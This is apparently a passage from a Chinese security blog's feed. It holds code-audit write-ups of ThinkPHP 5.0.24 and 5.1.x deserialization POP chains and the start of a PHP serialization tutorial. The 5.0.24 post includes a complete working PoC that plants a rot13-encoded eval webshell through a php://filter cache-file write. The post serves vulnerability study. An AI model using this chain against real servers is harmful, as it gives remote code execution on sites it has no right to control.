punctuation">\</span>Windows</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Windows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/11.png" alt="" loading="lazy"></p><h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a><strong>影响版本</strong></h4><p>不同版本生成的exp不同，如下是影响版本：</p><pre><code>5.1.3 &lt; tp &lt; 5.1.37</code></pre><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a><strong>参考文章</strong></h4><p>1.<a href="https://nikoeurus.github.io/2019/12/31/ThinkPHP%205.1.x反序列化" target="_blank" rel="noopener">https://nikoeurus.github.io/2019/12/31/ThinkPHP%205.1.x反序列化</a></p><p>2.<a href="https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5.1.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE.md" target="_blank" rel="noopener">https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5.1.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE.md</a></p><p>3.<a href="https://paper.seebug.org/1040/" target="_blank" rel="noopener">https://paper.seebug.org/1040/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;&lt;strong&gt;环境搭建&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;利用composer下载tp5.1.37的环境&lt;/p&gt;
&lt;pre class=&quot; lang
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5.0.24反序列化漏洞分析</title>
    <link href="http://yoursite.com/2020/05/07/ThinkPHP5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2020/05/07/ThinkPHP5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2020-05-06T16:00:00.000Z</published>
    <updated>2020-05-07T07:34:44.194Z</updated>
    
    <content type="html"><![CDATA[<p>这个洞的利用需要利用tp进行二次开发，当unserialize的参数可控，既可触发这个洞。在index控制器中写入：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>index<span class="token punctuation">\</span>controller</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Index</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">'Welcome to ThinkPHP!'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="POP链构造分析"><a href="#POP链构造分析" class="headerlink" title="POP链构造分析"></a><strong>POP链构造分析</strong></h4><p>首先，进行全局搜索__destruct，查看thinkphp/library/think/process/pipes/Windows.php的Windows类中调用了__destruct魔术方法。</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">removeFiles</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟进removeFiles，发现file__exists函数，file__exists处理的时候会将当作字符串来处理，所以可以调用__toString，全局搜索__toString。</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">toJson</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟进toJson</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">toJson</span><span class="token punctuation">(</span><span class="token variable">$options</span> <span class="token operator">=</span> <span class="token constant">JSON_UNESCAPED_UNICODE</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token keyword">return</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>继续跟进toArray方法，这里发现三处可以触发__call方法。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/1.png" alt="" loading="lazy"></p><p>经过分析最后一处的参数可控，可以调用__call方法，要执行到这里，要满足如下条件：</p><p>$this-&gt;append可控且为数组，进入下面关键两行代码。</p><pre class=" language-php"><code class="language-php"><span class="token variable">$modelRelation</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$relation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getRelationData</span><span class="token punctuation">(</span><span class="token variable">$modelRelation</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>$relation由$this-&gt;append控制，这里需要找个可控的点，在Model方法中getError方法可控</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟进getRelationData方法，要满足if语句的条件就可以让value可控</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/2.png" alt="" loading="lazy"></p><p>通过全局搜索isSelfRelation，发现isSelfRelation方法是类Relation，而HasOne，OneToOne是Relation的子类，所以$modelRelation可以实例化HasOne类，继续都下面的代码，要满足：</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">method_exists</span><span class="token punctuation">(</span><span class="token variable">$modelRelation</span><span class="token punctuation">,</span> <span class="token string">'getBindAttr'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>全局搜索getBindAttr，发现OneToOne中存在此方法，发现bindAttr可控</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getBindAttr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">bindAttr</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>最后value可控，执行<code>$item[$key] = $value ? $value-&gt;getAttr($attr) : null;</code>就可以调用到__call方法，全局查看__call，漏洞触发点在thinkphp/library/think/console/Output.php</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/3.png" alt="" loading="lazy"></p><p>跟进搜索block方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">block</span><span class="token punctuation">(</span><span class="token variable">$style</span><span class="token punctuation">,</span> <span class="token variable">$message</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">writeln</span><span class="token punctuation">(</span><span class="token string">"&lt;{$style}>{$message}&lt;/$style>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>继续跟进writeln，在跟进write</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/4.png" alt="" loading="lazy"></p><p>这里发现$this-&gt;handle可控，可以进行全局搜索wirte方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/5.png" alt="" loading="lazy"></p><p>找到thinkphp/library/think/session/driver/Memcached.php文件中存在write方法，且$this-&gt;handle可控，继续全局查找set方法，在文件thinkphp/library/think/cache/driver/File.php发现存在写入文件。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/6.png" alt="" loading="lazy"></p><p>这里跟进getCacheKey方法，查看filename是否可控</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/7.png" alt="" loading="lazy"></p><p>这里$this-&gt;options可控，目前filename可控了，现在就只需要写入的data可控了，跟进setTagItem方法看一下，发现又执行了一次set。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/8.png" alt="" loading="lazy"></p><p>发现value的值就为传进来的filename。最后，整个的pop链就分析完了，贴上<a href="https://www.anquanke.com/post/id/196364#h2-0" target="_blank" rel="noopener">安全客的一篇文章</a></p><p>的pop链图。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/9.png" alt="" loading="lazy"></p><p>最后，poc如下：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Pipes</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Windows</span> <span class="token keyword">extends</span> <span class="token class-name">Pipes</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//触发Model __toString(),子类Pivot合适</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span><span class="token shell-comment comment">#Relation</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>db<span class="token punctuation">\</span>Query</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Relation</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$selfRelation</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$query</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">selfRelation</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">query</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Query</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#class Query</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation</span><span class="token punctuation">;</span><span class="token shell-comment comment">#OneToOne HasOne</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Relation</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">OneToOne</span> <span class="token keyword">extends</span> <span class="token class-name">Relation</span><span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">HasOne</span> <span class="token keyword">extends</span> <span class="token class-name">OneToOne</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$bindAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">bindAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"no"</span><span class="token punctuation">,</span><span class="token string">"123"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>console</span><span class="token punctuation">;</span><span class="token shell-comment comment">#Output</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>Memcached</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Output</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$handle</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$styles</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handle</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Memcached</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//目的调用其write()</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">styles</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'getAttr'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span><span class="token shell-comment comment">#Model</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation<span class="token punctuation">\</span>HasOne</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>db<span class="token punctuation">\</span>Query</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Model</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$error</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$parent</span><span class="token punctuation">;</span><span class="token shell-comment comment">#修改处</span>    <span class="token keyword">protected</span> <span class="token variable">$selfRelation</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$query</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$aaaaa</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">parent</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Output</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#Output对象,目的是调用__call()</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'getError'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HasOne</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//Relation子类,且有getBindAttr()</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">selfRelation</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//isSelfRelation()</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">query</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Query</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>db</span><span class="token punctuation">;</span><span class="token shell-comment comment">#Query</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Query</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$model</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">model</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Output</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver</span><span class="token punctuation">;</span><span class="token shell-comment comment">#Memcached</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>File</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Memcached</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$handler</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handler</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//目的调用File->set()</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver</span><span class="token punctuation">;</span><span class="token shell-comment comment">#File</span><span class="token keyword">class</span> <span class="token class-name">File</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$tag</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span> <span class="token operator">=</span> <span class="token punctuation">[</span>            <span class="token string">'expire'</span>        <span class="token operator">=</span><span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token string">'cache_subdir'</span>  <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">false</span><span class="token punctuation">,</span>            <span class="token string">'prefix'</span>        <span class="token operator">=</span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">,</span>            <span class="token string">'path'</span>          <span class="token operator">=</span><span class="token operator">></span> 'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/write=string.rot13/resource=./&lt;?cuc cucvasb();riny($_TRG[pzq]);?>',</span>            <span class="token string">'data_compress'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">tag</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Windows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>poc只能对linux，windows限制了文件名，最后，文件的命名规则如下：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?</span>cuc <span class="token function">cucvasb</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">riny</span><span class="token punctuation">(</span><span class="token variable">$_TRG</span><span class="token punctuation">[</span>pzq<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span> <span class="token operator">+</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">'tag_'</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">tag</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/10.png" alt="" loading="lazy"></p><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a><strong>参考文章</strong></h4><p><a href="https://www.anquanke.com/post/id/196364#h2-0" target="_blank" rel="noopener">https://www.anquanke.com/post/id/196364#h2-0</a></p><p><a href="http://pines404.online/2020/01/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/ThinkPHP/ThinkPHP5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">http://pines404.online/2020/01/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/ThinkPHP/ThinkPHP5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这个洞的利用需要利用tp进行二次开发，当unserialize的参数可控，既可触发这个洞。在index控制器中写入：&lt;/p&gt;
&lt;pre class=&quot; language-php&quot;&gt;&lt;code class=&quot;language-php&quot;&gt;&lt;span class=&quot;token d
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>php反序列化到pop链构造</title>
    <link href="http://yoursite.com/2020/04/26/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0pop%E9%93%BE%E6%9E%84%E9%80%A0/"/>
    <id>http://yoursite.com/2020/04/26/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0pop%E9%93%BE%E6%9E%84%E9%80%A0/</id>
    <published>2020-04-25T16:00:00.000Z</published>
    <updated>2020-04-29T06:53:41.508Z</updated>
    
    <content type="html"><![CDATA[<h4 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a><strong>序列化与反序列化</strong></h4><p>在php中，使用serialize和unserialize两个函数表示序列化与反序列化。</p><pre><code>serialize：把一个对象转化成字节流的字符串，序列化的对象会保存类的属性，不会保存方法unserialize：把字节流字符串转化成一个对象</code></pre><p>看下下面的列子，通过serialize序列化返回字符串</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 属性</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$age</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 方法</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">Skill</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"My name is "</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">.</span><span class="token string">",I am is "</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span><span class="token punctuation">.</span><span class="token string">" years old!&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token string">'fanxing'</span><span class="token punctuation">,</span><span class="token string">'20'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>返回字节流的字符串</p><pre><code>O:1:&quot;A&quot;:2:{s:4:&quot;name&quot;;s:7:&quot;fanxing&quot;;s:3:&quot;age&quot;;s:2:&quot;20&quot;;}</code></pre><p>O代表对象:长度:类的名字:类的属性个数:{类型:长度:属性名字;类型:长度:属性值;…}</p><p>反序列化列子如下：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 属性</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$age</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span 